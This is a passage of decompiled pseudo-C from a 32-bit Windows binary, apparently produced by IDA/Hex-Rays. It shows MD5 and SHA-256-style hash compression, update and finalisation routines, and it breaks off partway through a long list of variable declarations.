    result = sub_40CDE0((unsigned __int8 *)(a2 + 24), (_DWORD *)a2);
    if ( result )
      return result;
    sub_413EB0(a2 + 24, 0, 0x38u);
  }
  else
  {
    sub_413EB0(v3 + a2 + 24, 0, 56 - v3);
  }
  v5 = 8 * *(_DWORD *)a2;
  v6 = *(__int64 *)a2 >> 29;
  *(_WORD *)(a2 + 80) = 8 * *(_WORD *)a2;
  *(_BYTE *)(a2 + 82) = BYTE2(v5);
  *(_BYTE *)(a2 + 83) = HIBYTE(v5);
  *(_DWORD *)(a2 + 84) = v6;
  result = sub_40CDE0((unsigned __int8 *)(a2 + 24), (_DWORD *)a2);
  if ( !result )
  {
    *a1 = *(_BYTE *)(a2 + 8);
    a1[1] = *(_BYTE *)(a2 + 9);
    a1[2] = *(_BYTE *)(a2 + 10);
    a1[3] = *(_BYTE *)(a2 + 11);
    a1[4] = *(_BYTE *)(a2 + 12);
    a1[5] = *(_BYTE *)(a2 + 13);
    a1[6] = *(_BYTE *)(a2 + 14);
    a1[7] = *(_BYTE *)(a2 + 15);
    a1[8] = *(_BYTE *)(a2 + 16);
    a1[9] = *(_BYTE *)(a2 + 17);
    a1[10] = *(_BYTE *)(a2 + 18);
    a1[11] = *(_BYTE *)(a2 + 19);
    a1[12] = *(_BYTE *)(a2 + 20);
    a1[13] = *(_BYTE *)(a2 + 21);
    a1[14] = *(_BYTE *)(a2 + 22);
    a1[15] = *(_BYTE *)(a2 + 23);
    return 0;
  }
  return result;
}

//----- (0040D9A0) --------------------------------------------------------
int __cdecl sub_40D9A0(__m128i *a1, int a2, _BYTE *a3)
{
  int v3; // esi
  int v5[22]; // [esp+10h] [ebp-58h] BYREF

  sub_413EB0((int)v5, 0, 0x58u);
  v5[0] = 0;
  v5[1] = 0;
  v5[2] = 1732584193;
  v5[3] = -271733879;
  v5[4] = -1732584194;
  v5[5] = 271733878;
  v3 = sub_40D7D0(a2, (int)v5, a1);
  if ( !v3 )
    v3 = sub_40D870(a3, (int)v5);
  sub_413EB0((int)v5, 0, 0x58u);
  return v3;
}

//----- (0040DA30) --------------------------------------------------------
int __usercall sub_40DA30@<eax>(int a1@<eax>, _DWORD *a2)
{
  int v2; // edx
  int v3; // esi
  int v5; // eax
  int v6; // esi
  int v7; // eax
  int v8; // esi
  int v9; // eax
  unsigned int v10; // ecx
  unsigned __int8 *v11; // esi
  unsigned int v12; // esi
  unsigned int v13; // eax
  int v14; // ecx
  unsigned int v15; // esi
  int v16; // ebx
  unsigned int v17; // esi
  unsigned int v18; // edx
  unsigned int v19; // edx
  unsigned int v20; // edx
  unsigned int v21; // esi
  unsigned int v22; // esi
  int v23; // edi
  unsigned int v24; // edi
  unsigned int v25; // esi
  unsigned int v26; // eax
  int v27; // ecx
  int v28; // esi
  unsigned int v29; // edi
  unsigned int v30; // esi
  unsigned int v31; // esi
  unsigned int v32; // edi
  unsigned int v33; // esi
  int v34; // edx
  unsigned int v35; // edi
  unsigned int v36; // esi
  unsigned int v37; // esi
  int v38; // esi
  unsigned int v39; // edi
  unsigned int v40; // edx
  unsigned int v41; // edx
  unsigned int v42; // edx
  unsigned int v43; // edi
  unsigned int v44; // edx
  unsigned int v45; // edi
  unsigned int v46; // esi
  int v47; // ebx
  unsigned int v48; // esi
  int v49; // edi
  int v50; // eax
  int v51; // eax
  _WORD v53[33]; // [esp+0h] [ebp-178h]
  char v54[4]; // [esp+42h] [ebp-136h] BYREF
  char v55[4]; // [esp+46h] [ebp-132h] BYREF
  char v56[246]; // [esp+4Ah] [ebp-12Eh] BYREF
  unsigned int v57; // [esp+140h] [ebp-38h]
  unsigned int v58; // [esp+144h] [ebp-34h]
  unsigned int v59; // [esp+148h] [ebp-30h]
  int v60; // [esp+14Ch] [ebp-2Ch]
  int v61; // [esp+150h] [ebp-28h]
  int v62; // [esp+154h] [ebp-24h]
  unsigned int v63; // [esp+15Ch] [ebp-1Ch]
  unsigned int v64; // [esp+160h] [ebp-18h]
  unsigned int v65; // [esp+164h] [ebp-14h]
  unsigned int v66; // [esp+16Ch] [ebp-Ch]
  unsigned int v67; // [esp+170h] [ebp-8h]
  unsigned int i; // [esp+174h] [ebp-4h]

  v2 = a2[3];
  v3 = a2[6];
  v5 = a2[2];
  v66 = (unsigned int)&v54[-a1];
  v63 = v3;
  v6 = a2[7];
  v60 = v5;
  v7 = a2[4];
  v58 = (unsigned int)&v55[-a1];
  v64 = v6;
  v8 = a2[8];
  v62 = v7;
  v9 = a2[5];
  v10 = a2[9];
  v65 = v8;
  v67 = 0;
  v11 = (unsigned __int8 *)(a1 + 2);
  v57 = (unsigned int)&v56[-a1];
  do
  {
    *(_DWORD *)&v53[2 * v67 + 32] = v11[1] | ((*v11 | ((*(v11 - 1) | (*(v11 - 2) << 8)) << 8)) << 8);
    *(_DWORD *)&v11[v66] = v11[5] | ((v11[4] | ((v11[3] | (v11[2] << 8)) << 8)) << 8);
    *(_DWORD *)&v11[v58] = v11[9] | ((v11[8] | ((v11[7] | (v11[6] << 8)) << 8)) << 8);
    *(_DWORD *)&v11[v57] = v11[13] | ((v11[12] | ((v11[11] | (v11[10] << 8)) << 8)) << 8);
    v11 += 16;
    v67 += 4;
  }
  while ( v67 < 0x10 );
  for ( i = 0; i < 0x40; i += 32 )
  {
    v12 = v10
        + *(_DWORD *)((char *)&v53[32] + i)
        + *(int *)((char *)&SHA512_Constants_41E818 + i)
        + (v65 ^ v63 & (v65 ^ v64))
        + (__ROR4__(v63, 6) ^ __ROL4__(v63, 7) ^ __ROR4__(v63, 11));
    v13 = v12 + v9;
    v67 = v12;
    v14 = (v60 & v2 | v62 & (v60 | v2)) + v12 + (__ROR4__(v60, 2) ^ __ROL4__(v60, 10) ^ __ROR4__(v60, 13));
    v15 = v65
        + *(_DWORD *)&v54[i + 2]
        + *(int *)((char *)&SHA512_Constants_41E81C + i)
        + (v64 ^ v13 & (v63 ^ v64))
        + (__ROR4__(v13, 6) ^ __ROL4__(v13, 7) ^ __ROR4__(v13, 11));
    v62 += v15;
    v67 = v15;
    v16 = v15 + (__ROR4__(v14, 2) ^ __ROL4__(v14, 10) ^ __ROR4__(v14, 13)) + (v14 & v60 | v2 & (v14 | v60));
    v65 = v16;
    v67 = v64
        + *(_DWORD *)&v55[i + 2]
        + *(int *)((char *)&SHA512_Constants_41E820 + i)
        + (v63 ^ v62 & (v63 ^ v13))
        + (__ROR4__(v62, 6) ^ __ROL4__(v62, 7) ^ __ROR4__(v62, 11));
    v61 = v67 + v2;
    v64 = (v14 & v65 | v60 & (v14 | v65)) + v67 + (__ROR4__(v16, 2) ^ __ROL4__(v16, 10) ^ __ROR4__(v16, 13));
    v17 = v63
        + *(_DWORD *)&v56[i + 2]
        + *(int *)((char *)&SHA512_Constants_41E824 + i)
        + (v13 ^ v61 & (v62 ^ v13))
        + (__ROR4__(v61, 6) ^ __ROL4__(v61, 7) ^ __ROR4__(v61, 11));
    v60 += v17;
    v67 = v17;
    v63 = (v65 & v64 | v14 & (v65 | v64)) + v17 + (__ROR4__(v64, 2) ^ __ROL4__(v64, 10) ^ __ROR4__(v64, 13));
    v18 = v13
        + *(_DWORD *)&v56[i + 6]
        + *(int *)((char *)&dword_41E828 + i)
        + (v62 ^ v60 & (v61 ^ v62))
        + (__ROR4__(v60, 6) ^ __ROL4__(v60, 7) ^ __ROR4__(v60, 11));
    v10 = v18 + v14;
    v9 = (v63 & v64 | v16 & (v63 | v64)) + v18 + (__ROR4__(v63, 2) ^ __ROL4__(v63, 10) ^ __ROR4__(v63, 13));
    v19 = v62
        + *(_DWORD *)&v56[i + 10]
        + *(int *)((char *)&dword_41E82C + i)
        + (v61 ^ v10 & (v60 ^ v61))
        + (__ROR4__(v10, 6) ^ __ROL4__(v10, 7) ^ __ROR4__(v10, 11));
    v65 = v19 + v16;
    v67 = v19;
    v62 = v19 + (__ROR4__(v9, 2) ^ __ROL4__(v9, 10) ^ __ROR4__(v9, 13)) + (v63 & v9 | v64 & (v63 | v9));
    v20 = v61
        + *(_DWORD *)&v56[i + 14]
        + *(int *)((char *)&dword_41E830 + i)
        + (v60 ^ v65 & (v10 ^ v60))
        + (__ROR4__(v65, 6) ^ __ROL4__(v19 + v16, 7) ^ __ROR4__(v19 + v16, 11));
    v64 += v20;
    v67 = v20;
    v2 = (v62 & v9 | v63 & (v62 | v9)) + v20 + (__ROR4__(v62, 2) ^ __ROL4__(v62, 10) ^ __ROR4__(v62, 13));
    v21 = v60
        + *(_DWORD *)&v56[i + 18]
        + *(int *)((char *)&dword_41E834 + i)
        + (v10 ^ v64 & (v10 ^ v65))
        + (__ROR4__(v64, 6) ^ __ROL4__(v64, 7) ^ __ROR4__(v64, 11));
    v63 += v21;
    v67 = v21;
    v60 = v21 + (__ROR4__(v2, 2) ^ __ROL4__(v2, 10) ^ __ROR4__(v2, 13)) + (v2 & v62 | v9 & (v2 | v62));
  }
  v22 = 64;
  i = 64;
  do
  {
    v23 = *(_DWORD *)((char *)&v53[2] + v22);
    v66 = *(_DWORD *)((char *)&v53[28] + v22);
    v24 = *(_DWORD *)((char *)v53 + i)
        + ((*(_DWORD *)((char *)&v53[2] + i) >> 3) ^ __ROR4__(v23, 7) ^ __ROL4__(v23, 14))
        + ((v66 >> 10) ^ __ROL4__(v66, 13) ^ __ROL4__(v66, 15))
        + *(_DWORD *)((char *)&v53[18] + i);
    *(_DWORD *)((char *)&v53[32] + i) = v24;
    v57 = v24;
    v25 = v10
        + v24
        + *(int *)((char *)&SHA512_Constants_41E818 + i)
        + (v65 ^ v63 & (v65 ^ v64))
        + (__ROR4__(v63, 6) ^ __ROL4__(v63, 7) ^ __ROR4__(v63, 11));
    v26 = v25 + v9;
    v67 = v25;
    v27 = v25 + (__ROR4__(v60, 2) ^ __ROL4__(v60, 10) ^ __ROR4__(v60, 13)) + (v62 & (v60 | v2) | v2 & v60);
    v28 = *(_DWORD *)((char *)&v53[4] + i);
    v66 = *(_DWORD *)((char *)&v53[30] + i);
    v29 = i;
    v30 = *(_DWORD *)((char *)&v53[20] + i)
        + ((*(_DWORD *)((char *)&v53[4] + i) >> 3) ^ __ROR4__(v28, 7) ^ __ROL4__(v28, 14))
        + ((v66 >> 10) ^ __ROL4__(v66, 13) ^ __ROL4__(v66, 15))
        + *(_DWORD *)((char *)&v53[2] + i);
    *(_DWORD *)&v54[i + 2] = v30;
    v58 = v30;
    v31 = v65
        + v30
        + *(int *)((char *)&SHA512_Constants_41E81C + v29)
        + (v64 ^ v26 & (v63 ^ v64))
        + (__ROR4__(v26, 6) ^ __ROL4__(v26, 7) ^ __ROR4__(v26, 11));
    v62 += v31;
    v67 = v31;
    v66 = *(_DWORD *)((char *)&v53[6] + i);
    v65 = v31 + (__ROR4__(v27, 2) ^ __ROL4__(v27, 10) ^ __ROR4__(v27, 13)) + (v27 & v60 | v2 & (v27 | v60));
    v32 = *(_DWORD *)((char *)&v53[22] + i)
        + ((*(_DWORD *)((char *)&v53[6] + i) >> 3) ^ __ROR4__(v66, 7) ^ __ROL4__(v66, 14))
        + ((v57 >> 10) ^ __ROL4__(v57, 13) ^ __ROL4__(v57, 15))
        + *(_DWORD *)((char *)&v53[4] + i);
    *(_DWORD *)&v55[i + 2] = v32;
    v59 = v32;
    v33 = v64
        + v32
        + *(int *)((char *)&SHA512_Constants_41E820 + i)
        + (v63 ^ v62 & (v63 ^ v26))
        + (__ROR4__(v62, 6) ^ __ROL4__(v62, 7) ^ __ROR4__(v62, 11));
    v34 = v33 + v2;
    v67 = v33;
    v64 = v33 + (__ROR4__(v65, 2) ^ __ROL4__(v65, 10) ^ __ROR4__(v65, 13)) + (v27 & v65 | v60 & (v27 | v65));
    v66 = *(_DWORD *)((char *)&v53[8] + i);
    v35 = i;
    v36 = *(_DWORD *)((char *)&v53[24] + i)
        + ((*(_DWORD *)((char *)&v53[8] + i) >> 3) ^ __ROR4__(v66, 7) ^ __ROL4__(v66, 14))
        + ((v58 >> 10) ^ __ROL4__(v58, 13) ^ __ROL4__(v58, 15))
        + *(_DWORD *)((char *)&v53[6] + i);
    *(_DWORD *)&v56[i + 2] = v36;
    v58 = v36;
    v61 = v34;
    v37 = v63
        + v36
        + *(int *)((char *)&SHA512_Constants_41E824 + v35)
        + (v26 ^ v34 & (v62 ^ v26))
        + (__ROR4__(v34, 6) ^ __ROL4__(v34, 7) ^ __ROR4__(v34, 11));
    v60 += v37;
    v67 = v37;
    v38 = v37 + (__ROR4__(v64, 2) ^ __ROL4__(v64, 10) ^ __ROR4__(v64, 13)) + (v27 & (v65 | v64) | v64 & v65);
    v39 = *(_DWORD *)((char *)&v53[26] + i)
        + ((v59 >> 10) ^ __ROL4__(v59, 13) ^ __ROL4__(v59, 15))
        + ((*(_DWORD *)((char *)&v53[10] + i) >> 3) ^ __ROR4__(*(_DWORD *)((char *)&v53[10] + i), 7) ^ __ROL4__(*(_DWORD *)((char *)&v53[10] + i), 14))
        + *(_DWORD *)((char *)&v53[8] + i);
    *(_DWORD *)&v56[i + 6] = v39;
    v66 = v39;
    v63 = v38;
    v40 = v26
        + v39
        + *(int *)((char *)&dword_41E828 + i)
        + (v62 ^ v60 & (v61 ^ v62))
        + (__ROR4__(v60, 6) ^ __ROL4__(v60, 7) ^ __ROR4__(v60, 11));
    v10 = v40 + v27;
    v9 = v40 + (__ROR4__(v38, 2) ^ __ROL4__(v38, 10) ^ __ROR4__(v38, 13)) + (v65 & (v38 | v64) | v38 & v64);
    v59 = *(_DWORD *)((char *)&v53[12] + i);
    v41 = *(_DWORD *)((char *)&v53[10] + i)
        + ((v58 >> 10) ^ __ROL4__(v58, 13) ^ __ROL4__(v58, 15))
        + ((*(_DWORD *)((char *)&v53[12] + i) >> 3) ^ __ROR4__(v59, 7) ^ __ROL4__(v59, 14))
        + *(_DWORD *)((char *)&v53[28] + i);
    *(_DWORD *)&v56[i + 10] = v41;
    v59 = v41;
    v42 = v62
        + v41
        + *(int *)((char *)&dword_41E82C + i)
        + (v61 ^ v10 & (v60 ^ v61))
        + (__ROR4__(v10, 6) ^ __ROL4__(v10, 7) ^ __ROR4__(v10, 11));
    v65 += v42;
    v67 = v42;
    v58 = *(_DWORD *)((char *)&v53[14] + i);
    v62 = v42 + (__ROR4__(v9, 2) ^ __ROL4__(v9, 10) ^ __ROR4__(v9, 13)) + (v38 & v9 | v64 & (v38 | v9));
    v43 = *(_DWORD *)((char *)&v53[12] + i)
        + ((v66 >> 10) ^ __ROL4__(v66, 13) ^ __ROL4__(v66, 15))
        + ((*(_DWORD *)((char *)&v53[14] + i) >> 3) ^ __ROR4__(v58, 7) ^ __ROL4__(v58, 14))
        + *(_DWORD *)((char *)&v53[30] + i);
    *(_DWORD *)&v56[i + 14] = v43;
    v66 = v43;
    v44 = v61
        + v43
        + *(int *)((char *)&dword_41E830 + i)
        + (v60 ^ v65 & (v10 ^ v60))
        + (__ROR4__(v65, 6) ^ __ROL4__(v65, 7) ^ __ROR4__(v65, 11));
    v64 += v44;
    v67 = v44;
    v2 = v44 + (__ROR4__(v62, 2) ^ __ROL4__(v62, 10) ^ __ROR4__(v62, 13)) + (v38 & (v62 | v9) | v9 & v62);
    v45 = i;
    v46 = v57
        + *(_DWORD *)((char *)&v53[14] + i)
        + ((*(_DWORD *)((char *)&v53[16] + i) >> 3) ^ __ROR4__(*(_DWORD *)((char *)&v53[16] + i), 7) ^ __ROL4__(*(_DWORD *)((char *)&v53[16] + i), 14))
        + ((v59 >> 10) ^ __ROL4__(v59, 13) ^ __ROL4__(v59, 15));
    v47 = v64;
    *(_DWORD *)&v56[i + 18] = v46;
    v66 = v46;
    v48 = v60
        + v46
        + *(int *)((char *)&dword_41E834 + v45)
        + (v10 ^ v64 & (v10 ^ v65))
        + (__ROR4__(v64, 6) ^ __ROL4__(v47, 7) ^ __ROR4__(v47, 11));
    v63 += v48;
    v67 = v48;
    v22 = i + 32;
    v49 = (v2 & v62 | v9 & (v2 | v62)) + v67 + (__ROR4__(v2, 2) ^ __ROL4__(v2, 10) ^ __ROR4__(v2, 13));
    v60 = v49;
    i = v22;
  }
  while ( v22 < 0x100 );
  a2[3] += v2;
  a2[5] += v9;
  v50 = v63;
  a2[4] += v62;
  a2[6] += v50;
  a2[2] += v49;
  v51 = v65;
  a2[7] += v64;
  a2[8] += v51;
  a2[9] += v10;
  return 0;
}
// 41E818: using guessed type int SHA512_Constants_41E818;
// 41E81C: using guessed type int SHA512_Constants_41E81C;
// 41E820: using guessed type int SHA512_Constants_41E820;
// 41E824: using guessed type int SHA512_Constants_41E824;
// 41E828: using guessed type int dword_41E828;
// 41E82C: using guessed type int dword_41E82C;
// 41E830: using guessed type int dword_41E830;
// 41E834: using guessed type int dword_41E834;

//----- (0040E460) --------------------------------------------------------
int __usercall sub_40E460@<eax>(int result@<eax>, unsigned int *a2@<ebx>, const __m128i *a3)
{
  unsigned int v3; // edi
  unsigned int v4; // ecx
  unsigned int v5; // esi
  int v6; // [esp+4h] [ebp-4h]

  v3 = result;
  if ( result )
  {
    result = *a2 & 0x3F;
    v4 = v3 + *a2;
    v5 = 64 - result;
    v6 = result;
    *a2 = v4;
    if ( v4 < v3 )
      ++a2[1];
    if ( result && v3 >= v5 )
    {
      sub_415930((unsigned int)a2 + result + 40, a3, 64 - result);
      result = sub_40DA30((int)(a2 + 10), a2);
      if ( result )
        return result;
      a3 = (const __m128i *)((char *)a3 + v5);
      v3 -= v5;
      v6 = 0;
    }
    if ( v3 < 0x40 )
    {
LABEL_12:
      if ( v3 )
        sub_415930((unsigned int)a2 + result + 40, a3, v3);
      return 0;
    }
    else
    {
      while ( 1 )
      {
        result = sub_40DA30((int)a3, a2);
        if ( result )
          break;
        a3 += 4;
        v3 -= 64;
        if ( v3 < 0x40 )
        {
          result = v6;
          goto LABEL_12;
        }
      }
    }
  }
  return result;
}

//----- (0040E500) --------------------------------------------------------
int __usercall sub_40E500@<eax>(_BYTE *a1@<edi>, int *a2@<esi>)
{
  int v2; // eax
  unsigned int v3; // eax
  int result; // eax
  int v5; // ecx
  int v6; // eax

  v2 = *a2 & 0x3F;
  *((_BYTE *)a2 + v2 + 40) = 0x80;
  v3 = v2 + 1;
  if ( v3 > 0x38 )
  {
    sub_413EB0((int)a2 + v3 + 40, 0, 64 - v3);
    result = sub_40DA30((int)(a2 + 10), a2);
    if ( result )
      return result;
    sub_413EB0((int)(a2 + 10), 0, 0x38u);
  }
  else
  {
    sub_413EB0((int)a2 + v3 + 40, 0, 56 - v3);
  }
  v5 = *a2;
  v6 = *(__int64 *)a2 >> 29;
  *((_BYTE *)a2 + 96) = HIBYTE(v6);
  *((_BYTE *)a2 + 97) = BYTE2(v6);
  *((_BYTE *)a2 + 99) = v6;
  v5 *= 8;
  *((_BYTE *)a2 + 100) = HIBYTE(v5);
  *((_BYTE *)a2 + 98) = BYTE1(v6);
  *((_BYTE *)a2 + 102) = BYTE1(v5);
  *((_BYTE *)a2 + 101) = BYTE2(v5);
  *((_BYTE *)a2 + 103) = v5;
  result = sub_40DA30((int)(a2 + 10), a2);
  if ( !result )
  {
    *a1 = *((_BYTE *)a2 + 11);
    a1[1] = *((_BYTE *)a2 + 10);
    a1[2] = BYTE1(a2[2]);
    a1[3] = *((_BYTE *)a2 + 8);
    a1[4] = *((_BYTE *)a2 + 15);
    a1[5] = *((_BYTE *)a2 + 14);
    a1[6] = BYTE1(a2[3]);
    a1[7] = *((_BYTE *)a2 + 12);
    a1[8] = *((_BYTE *)a2 + 19);
    a1[9] = *((_BYTE *)a2 + 18);
    a1[10] = BYTE1(a2[4]);
    a1[11] = *((_BYTE *)a2 + 16);
    a1[12] = *((_BYTE *)a2 + 23);
    a1[13] = *((_BYTE *)a2 + 22);
    a1[14] = BYTE1(a2[5]);
    a1[15] = *((_BYTE *)a2 + 20);
    a1[16] = *((_BYTE *)a2 + 27);
    a1[17] = *((_BYTE *)a2 + 26);
    a1[18] = BYTE1(a2[6]);
    a1[19] = *((_BYTE *)a2 + 24);
    a1[20] = *((_BYTE *)a2 + 31);
    a1[21] = *((_BYTE *)a2 + 30);
    a1[22] = BYTE1(a2[7]);
    a1[23] = *((_BYTE *)a2 + 28);
    a1[24] = *((_BYTE *)a2 + 35);
    a1[25] = *((_BYTE *)a2 + 34);
    a1[26] = BYTE1(a2[8]);
    a1[27] = *((_BYTE *)a2 + 32);
    if ( !a2[26] )
    {
      a1[28] = *((_BYTE *)a2 + 39);
      a1[29] = *((_BYTE *)a2 + 38);
      a1[30] = BYTE1(a2[9]);
      a1[31] = *((_BYTE *)a2 + 36);
    }
    return 0;
  }
  return result;
}

//----- (0040E6B0) --------------------------------------------------------
int __usercall sub_40E6B0@<eax>(unsigned __int8 *a1@<eax>, _DWORD *a2)
{
  int v2; // ecx
  int v3; // edx
  int v4; // esi
  int v5; // eax
  int v6; // edi
  int v7; // edi
  int v8; // edi
  int v9; // eax
  int v10; // edi
  int v11; // eax
  int v12; // edi
  int v13; // eax
  int v14; // edi
  int v15; // eax
  int v16; // edi
  int v17; // eax
  int v18; // edi
  int v19; // edi
  int v20; // edi
  int v21; // edi
  int v22; // edi
  int v23; // eax
  int v24; // edi
  int v25; // eax
  int v26; // edi
  int v27; // eax
  int v28; // edx
  int v29; // edi
  int v30; // esi
  int v31; // eax
  int v32; // edx
  int v33; // edi
  int v34; // esi
  int v35; // eax
  int v36; // ebx
  int v37; // edx
  int v38; // ebx
  int v39; // esi
  int v40; // eax
  int v42; // [esp+18h] [ebp-60h]
  int v43; // [esp+1Ch] [ebp-5Ch]
  int v44; // [esp+20h] [ebp-58h]
  int v45; // [esp+24h] [ebp-54h]
  int v46; // [esp+28h] [ebp-50h]
  int v47; // [esp+2Ch] [ebp-4Ch]
  int v48; // [esp+30h] [ebp-48h]
  int v49; // [esp+34h] [ebp-44h]
  int v50; // [esp+38h] [ebp-40h]
  int v51; // [esp+3Ch] [ebp-3Ch]
  int v52; // [esp+40h] [ebp-38h]
  int v53; // [esp+44h] [ebp-34h]
  int v54; // [esp+48h] [ebp-30h]
  int v55; // [esp+50h] [ebp-28h]
  int v56; // [esp+50h] [ebp-28h]
  int v57; // [esp+50h] [ebp-28h]
  int v58; // [esp+50h] [ebp-28h]
  int v59; // [esp+50h] [ebp-28h]
  int v60; // [esp+50h] [ebp-28h]
  int v61; // [esp+50h] [ebp-28h]
  int v62; // [esp+50h] [ebp-28h]
  int v63; // [esp+50h] [ebp-28h]
  int v64; // [esp+50h] [ebp-28h]
  int v65; // [esp+50h] [ebp-28h]
  int v66; // [esp+50h] [ebp-28h]
  int v67; // [esp+50h] [ebp-28h]
  int v68; // [esp+50h] [ebp-28h]
  int v69; // [esp+50h] [ebp-28h]
  int v70; // [esp+50h] [ebp-28h]
  int v71; // [esp+50h] [ebp-28h]
  int v72; // [esp+50h] [ebp-28h]
  int v73; // [esp+50h] [ebp-28h]
  int v74; // [esp+50h] [ebp-28h]
  int v75; // [esp+50h] [ebp-28h]
  int v76; // [esp+50h] [ebp-28h]
  int v77; // [esp+50h] [ebp-28h]
  int v78; // [esp+50h] [ebp-28h]
  int v79; // [esp+50h] [ebp-28h]
  int v80; // [esp+50h] [ebp-28h]
  int v81; // [esp+50h] [ebp-28h]
  int v82; // [esp+50h] [ebp-28h]
  int v83; // [esp+54h] [ebp-24h]
  int v84; // [esp+54h] [ebp-24h]
  int v85; // [esp+54h] [ebp-24h]
  int v86; // [esp+54h] [ebp-24h]
  int v87; // [esp+54h] [ebp-24h]
  int v88; // [esp+54h] [ebp-24h]
  int v89; // [esp+54h] [ebp-24h]
  int v90; // [esp+54h] [ebp-24h]
  int v91; // [esp+54h] [ebp-24h]
  int v92; // [esp+54h] [ebp-24h]
  int v93; // [esp+54h] [ebp-24h]
  int v94; // [esp+54h] [ebp-24h]
  int v95; // [esp+54h] [ebp-24h]
  int v96; // [esp+54h] [ebp-24h]
  int v97; // [esp+54h] [ebp-24h]
  int v98; // [esp+54h] [ebp-24h]
  int v99; // [esp+54h] [ebp-24h]
  int v100; // [esp+54h] [ebp-24h]
  int v101; // [esp+54h] [ebp-24h]
  int v102; // [esp+54h] [ebp-24h]
  int v103; // [esp+54h] [ebp-24h]
  int v104; // [esp+54h] [ebp-24h]
  int v105; // [esp+54h] [ebp-24h]
  int v106; // [esp+54h] [ebp-24h]
  int v107; // [esp+54h] [ebp-24h]
  int v108; // [esp+54h] [ebp-24h]
  int v109; // [esp+54h] [ebp-24h]
  int v110; // [esp+54h] [ebp-24h]
  int v111; // [esp+54h] [ebp-24h]
  int v112; // [esp+58h] [ebp-20h]
  int v113; // [esp+58h] [ebp-20h]
  int v114; // [esp+58h] [ebp-20h]
  int v115; // [esp+58h] [ebp-20h]
  int v116; // [esp+58h] [ebp-20h]
  int v117; // [esp+58h] [ebp-20h]
  int v118; // [esp+58h] [ebp-20h]
  int v119; // [esp+58h] [ebp-20h]
  int v120; // [esp+58h] [ebp-20h]
  int v121; // [esp+58h] [ebp-20h]
  int v122; // [esp+58h] [ebp-20h]
  int v123; // [esp+58h] [ebp-20h]
  int v124; // [esp+58h] [ebp-20h]
  int v125; // [esp+58h] [ebp-20h]
  int v126; // [esp+58h] [ebp-20h]
  int v127; // [esp+58h] [ebp-20h]
  int v128; // [esp+58h] [ebp-20h]
  int v129; // [esp+58h] [ebp-20h]
  int v130; // [esp+58h] [ebp-20h]
  int v131; // [esp+58h] [ebp-20h]
  int v132; // [esp+58h] [ebp-20h]
  int v133; // [esp+58h] [ebp-20h]
  int v134; // [esp+58h] [ebp-20h]
  int v135; // [esp+58h] [ebp-20h]
  int v136; // [esp+58h] [ebp-20h]
  int v137; // [esp+58h] [ebp-20h]
  int v138; // [esp+58h] [ebp-20h]
  int v139; // [esp+58h] [ebp-20h]
  int v140; // [esp+5Ch] [ebp-1Ch]
  int v141; // [esp+5Ch] [ebp-1Ch]
  int v142; // [esp+5Ch] [ebp-1Ch]
  int v143; // [esp+5Ch] [ebp-1Ch]
  int v144; // [esp+5Ch] [ebp-1Ch]
  int v145; // [esp+5Ch] [ebp-1Ch]
  int v146; // [esp+5Ch] [ebp-1Ch]
  int v147; // [esp+5Ch] [ebp-1Ch]
  int v148; // [esp+5Ch] [ebp-1Ch]
  int v149; // [esp+5Ch] [ebp-1Ch]
  int v150; // [esp+5Ch] [ebp-1Ch]
  int v151; // [esp+5Ch] [ebp-1Ch]
  int v152; // [esp+5Ch] [ebp-1Ch]
  int v153; // [esp+5Ch] [ebp-1Ch]
  int v154; // [esp+5Ch] [ebp-1Ch]
  int v155; // [esp+5Ch] [ebp-1Ch]
  int v156; // [esp+5Ch] [ebp-1Ch]
  int v157; // [esp+5Ch] [ebp-1Ch]
  int v158; // [esp+5Ch] [ebp-1Ch]
  int v159; // [esp+5Ch] [ebp-1Ch]
  int v160; // [esp+5Ch] [ebp-1Ch]
  int v161; // [esp+5Ch] [ebp-1Ch]
  int v162; // [esp+5Ch] [ebp-1Ch]
  int v163; // [esp+5Ch] [ebp-1Ch]
  int v164; // [esp+5Ch] [ebp-1Ch]
  int v165; // [esp+5Ch] [ebp-1Ch]
  int v166; // [esp+5Ch] [ebp-1Ch]
  int v167; // [esp+5Ch] [ebp-1Ch]
  int v168; // [esp+60h] [ebp-18h]
  int v169; // [esp+60h] [ebp-18h]
  int v170; // [esp+60h] [ebp-18h]
  int v171; // [esp+60h] [ebp-18h]
  int v172; // [esp+60h] [ebp-18h]
  int v173; // [esp+60h] [ebp-18h]
  int v174; // [esp+60h] [ebp-18h]
  int v175; // [esp+60h] [ebp-18h]
  int v176; // [esp+60h] [ebp-18h]
  int v177; // [esp+60h] [ebp-18h]
  int v178; // [esp+60h] [ebp-18h]
  int v179; // [esp+60h] [ebp-18h]
  int v180; // [esp+60h] [ebp-18h]
  int v181; // [esp+60h] [ebp-18h]
  int v182; // [esp+60h] [ebp-18h]
  int v183; // [esp+60h] [ebp-18h]
  int v184; // [esp+60h] [ebp-18h]
  int v185; // [esp+60h] [ebp-18h]
  int v186; // [esp+60h] [ebp-18h]
  int v187; // [esp+60h] [ebp-18h]
  int v188; // [esp+60h] [ebp-18h]
  int v189; // [esp+60h] [ebp-18h]
  int v190; // [esp+60h] [ebp-18h]
  int v191; // [esp+60h] [ebp-18h]
  int v192; // [esp+60h] [ebp-18h]
  int v193; // [esp+60h] [ebp-18h]
  int v194; // [esp+60h] [ebp-18h]
  int v195; // [esp+60h] [ebp-18h]
  int v196; // [esp+60h] [ebp-18h]
  int v197; // [esp+64h] [ebp-14h]
  int v198; // [esp+64h] [ebp-14h]
  int v199; // [esp+64h] [ebp-14h]
  int v200; // [esp+64h] [ebp-14h]
  int v201; // [esp+64h] [ebp-14h]
  int v202; // [esp+64h] [ebp-14h]
  int v203; // [esp+64h] [ebp-14h]
  int v204; // [esp+64h] [ebp-14h]
  int v205; // [esp+64h] [ebp-14h]
  int v206; // [esp+64h] [ebp-14h]
  int v207; // [esp+64h] [ebp-14h]
  int v208; // [esp+64h] [ebp-14h]
  int v209; // [esp+64h] [ebp-14h]
  int v210; // [esp+64h] [ebp-14h]
  int v211; // [esp+64h] [ebp-14h]
  int v212; // [esp+64h] [ebp-14h]
  int v213; // [esp+64h] [ebp-14h]
  int v214; // [esp+64h] [ebp-14h]
  int v215; // [esp+64h] [ebp-14h]
  int v216; // [esp+64h] [ebp-14h]
  int v217; // [esp+64h] [ebp-14h]
  int v218; // [esp+64h] [ebp-14h]
  int v219; // [esp+64h] [ebp-14h]
  int v220; // [esp+64h] [ebp-14h]
  int v221; // [esp+64h] [ebp-14h]
  int v222; // [esp+64h] [ebp-14h]
  int v223; // [esp+64h] [ebp-14h]
  int v224; // [esp+64h] [ebp-14h]
  int v225; // [esp+64h] [ebp-14h]
  int v226; // [esp+68h] [ebp-10h]
